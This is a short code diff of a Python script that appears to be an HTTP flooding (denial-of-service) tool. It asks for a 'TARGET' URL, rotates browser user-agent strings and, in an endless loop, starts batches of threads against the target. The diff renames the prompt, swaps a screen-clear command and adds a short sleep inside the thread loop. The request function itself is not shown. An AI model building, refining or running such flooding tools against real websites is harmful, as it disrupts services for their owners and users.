@@ -5,11 +5,11 @@ import random
 import requests
 import threading
 
-os.system("cls")
+os.system("clear")
 
 start = time.perf_counter()
 
-url = str(input("URL: "))
+url = str(input("TARGET: "))
 
 uagent = {
     "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
@@ -61,6 +61,7 @@ v = True
 
 while v:
   for _ in range(100):
+    time.sleep(0.1)
     t1 = threading.Thread(target=website)
     t1.start()
     t2 = threading.Thread(target=website)
